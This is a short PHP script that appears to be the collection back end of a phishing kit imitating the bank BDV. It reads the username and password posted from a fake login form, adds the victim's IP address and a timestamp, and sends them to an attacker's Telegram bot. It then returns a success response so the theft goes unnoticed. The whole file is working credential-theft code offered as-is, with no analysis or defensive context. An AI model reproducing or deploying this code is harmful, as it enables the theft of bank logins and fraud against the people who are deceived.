<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
error_reporting(0);

$usuario = $_POST['usuario'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$fecha = date('Y-m-d H:i:s');

$token = getenv('TELEGRAM_TOKEN');
$chat_id = getenv('TELEGRAM_CHAT_ID');

$mensaje = "🏦 BDV\n";
$mensaje .= "👤 Usuario: $usuario\n";
$mensaje .= "🔑 Clave: $password\n";
$mensaje .= "🌐 IP: $ip\n";
$mensaje .= "📅 Fecha: $fecha\n";

$url = "https://api.telegram.org/bot$token/sendMessage";
$data = array('chat_id' => $chat_id, 'text' => $mensaje);

file_get_contents($url . "?" . http_build_query($data));

echo json_encode(["success" => true]);
?> 